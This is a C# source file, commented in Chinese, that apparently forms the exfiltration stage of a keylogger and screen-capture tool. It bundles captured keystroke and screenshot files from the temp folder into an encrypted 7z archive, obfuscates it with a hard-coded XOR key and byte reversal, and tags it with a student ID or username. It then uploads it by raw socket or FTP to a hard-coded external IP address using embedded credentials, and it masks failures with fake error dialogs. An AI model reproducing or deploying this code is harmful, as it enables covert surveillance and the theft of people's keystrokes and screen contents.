using System;
using System.IO;
using SevenZip;
using System.Net;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Linq;
using System.Net.Sockets;

namespace PackAndSend
{
    /*将敲击记录和截图打包 --> 将打包文件进行混淆（和key进行异或、倒置输出）*/
    class MakePackage
    {
        public void PackageUpBy7z()
        {
            // 带着7z这个dll，就放本地就行了.
            SevenZipCompressor.SetLibraryPath("7z.dll");

            //将图片和敲击记录打包成7z文件的地方，生成的7z压缩包为 vm-73726-56566b-65796c6f67-6572
            string TempPath = Environment.GetEnvironmentVariable("temp");

            string file_1 = TempPath + @"\kbl-533eca-724b-4714.tmp";
            string file_2 = TempPath + @"\SCnr.tmp";

            // 键盘记录如果没用产生敲击就不产生文件，所以要判断，没有就创建一个空的
            if (!File.Exists(file_1))
            {
                FileStream f1 = new FileStream(TempPath + @"\kbl-533eca-724b-4714.tmp", FileMode.Create, FileAccess.Write);
                f1.Close();
            }
            if (!File.Exists(file_2))
            {
                FileStream f2 = new FileStream(TempPath + @"\SCnr.tmp", FileMode.Create, FileAccess.Write);
                f2.Close();
            }

            string[] filePath = { TempPath + @"\kbl-533eca-724b-4714.tmp", TempPath + @"\SCnr.tmp" };
            string archiveName = TempPath + @"\vm-73726-56566b-65796c6f67-6572";

            // MD5 => Rootkit20221216
            string pawd = "JNsec-7A7576A96BFB33A66F8FE5EAED4BDBBA#";

            SevenZipCompressor compressor = new SevenZipCompressor();

            compressor.ScanOnlyWritable = true;
            compressor.CompressFilesEncrypted(archiveName, pawd, filePath);
            Thread.Sleep(1000);
            EncryptoPackage();
        }

        public void EncryptoPackage()
        {
            string key = @"{07;/<<=?@FBZXY[\]^_`aybz}";
            string TempPath = Environment.GetEnvironmentVariable("temp");

            //将压缩包进行异或混淆的目录，生成的文件为%temp%目录里的 vm_AB0-E370-4cde-98D3-#
            string PackagePath = TempPath + @"\vm-73726-56566b-65796c6f67-6572";
            string OutPath = TempPath + @"\vm_AB0-E370-4cde-98D3-#";

            int i;

            FileStream file = new FileStream(PackagePath, FileMode.Open, FileAccess.Read);

            BinaryReader Package = new BinaryReader(file);
            byte[] content = Package.ReadBytes((int)file.Length);

            for (i = 0; i < content.Length; i++)
            {
                content[i] ^= (byte)key[i % key.Length];
            }
            Array.Reverse(content);
            Package.Close();

            // 读取init文件中学号加到加密包最后
            try
            {
                string stuid = File.ReadAllLines("authre.init")[1].Split(' ')[2];
                byte[] stuID = Encoding.UTF8.GetBytes(stuid);
                byte[] combined = System.Linq.Enumerable.Concat(content, stuID).ToArray();
                FileStream file2 = new FileStream(OutPath, FileMode.Create, FileAccess.Write);
                BinaryWriter Out = new BinaryWriter(file2);

                //写入文件
                Out.Write(combined);
                file2.Close();
            }
            catch
            {
                byte[] stuID = Encoding.UTF8.GetBytes(Environment.UserName);
                byte[] combined = System.Linq.Enumerable.Concat(content, stuID).ToArray();
                FileStream file2 = new FileStream(OutPath, FileMode.Create, FileAccess.Write);
                BinaryWriter Out = new BinaryWriter(file2);

                //写入文件
                Out.Write(combined);
                file2.Close();
            }
        }
    }

    class SendToServe
    {
        /*利用socket发包*/
        public void SendBySocket()
        {
            // 服务端存贮的名称用发送文件结尾最后追加的学号
            // 创建 TcpClient 对象并连接到服务器
            TcpClient client = new TcpClient();
            client.Connect("82.156.14.45", 12001);

            // 获取 NetworkStream 对象
            NetworkStream stream = client.GetStream();

            // 发送文件数据
            string TempPath = Environment.GetEnvironmentVariable("temp");
            string fileName = TempPath + @"\vm_AB0-E370-4cde-98D3-#";

            //string fileName = "C:\\Users\\rootkit\\AppData\\Local\\Temp\\vm_AB0-E370-4cde-98D3-#";
            byte[] fileData = File.ReadAllBytes(fileName);
            stream.Write(fileData, 0, fileData.Length);

            // 关闭连接
            stream.Close();
            client.Close();
        }

        /*两个发送方法的作用一致，视情况而定*/
        public void Send2ftp(string StuID)
        {
            /*这个本地服务器可通*/
            // Set the FTP credentials,这里用户名随便，密码要用强密码：{.R0sdsje12/_/11256320}
            string username = "ftpuser";
            string password = "test";
            //string host = "ftp://192.168.183.144";
            //string host = "ftp://192.168.220.150";
            string host = "ftp://82.156.14.45";

            // Set the local file path
            // 注意这里的发送的目录是上面的vm_AB0-E370-4cde-98D3-#文件
            string TempPath = Environment.GetEnvironmentVariable("temp");
            string localFilePath = TempPath + @"\vm_AB0-E370-4cde-98D3-#";

            // Set the remote file path, 这里用输入的学号
            string remoteFilePath = "/2recv_" + StuID;

            // Create a new FTP request
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(host + remoteFilePath);
            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.Credentials = new NetworkCredential(username, password);
            // 返回227添加这句话
            request.UsePassive= false;
            // Read the local file into a byte array

            byte[] fileContents;
            using (StreamReader sr = new StreamReader(localFilePath))
            {
                Encoding fileEncoding = Encoding.GetEncoding("gb2312");
                fileContents = fileEncoding.GetBytes(sr.ReadToEnd());
                //fileContents = Encoding.UTF8.GetBytes(sr.ReadToEnd());
            }
            //MessageBox.Show("可能的错误位置，编码错误");

            // Set the request's content length
            request.ContentLength = fileContents.Length;

            // Write the file contents to the request stream
            using (Stream requestStream = request.GetRequestStream())
            {
                requestStream.Write(fileContents, 0, fileContents.Length);
            }

            // Send the request and get the response
            using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
            {
                //Console.WriteLine($"Upload status: {response.StatusDescription}");
            }
        }
        public void Copy2ftp(string StuID)
        {
            /*本地ftp服务器可通*/
            //设置FTP服务器的地址（包括用户名和密码）
            //string ftpServerAddress = "ftp://ftpuser:test@192.168.183.144";
            string ftpServerAddress = "ftp://ftpuser:test@82.156.14.45";

            // 设置本地文件的路径
            string TempPath = Environment.GetEnvironmentVariable("temp");
            string localFilePath = TempPath + @"\vm_AB0-E370-4cde-98D3-#";

            // 设置远程文件的路径
            string remoteFilePath = "/2recv_" + StuID;

            // 创建FtpWebRequest对象
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(ftpServerAddress + remoteFilePath);
            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.UsePassive= false;

            // 将本地文件复制到FTP服务器
            using (Stream fileStream = File.OpenRead(localFilePath))
            {
                Stream requestStream = request.GetRequestStream();
                fileStream.CopyTo(requestStream);
                fileStream.Close();
            }
        }
    }

    class MainProgram
    {
        public static void Main_PackAndSend(string argc)
        {
            string Stunum = argc;
            try
            {
                MakePackage packager = new MakePackage();
                packager.PackageUpBy7z();
            }
            catch
            {
                MessageBox.Show("UNKnow Error", "ErrorCode 0xC0000000000BAFE1");
                Environment.Exit(0);
            }


            try
            {
                SendToServe Sender = new SendToServe();
                //Sender.Copy2ftp(Stunum);
                //Sender.Send2ftp(Stunum);
                Sender.SendBySocket();
            }
            catch
            {
                MessageBox.Show("UNKnow Error", "ErrorCode 0xC0000000000AEBD1");
            }

        }
    }
}
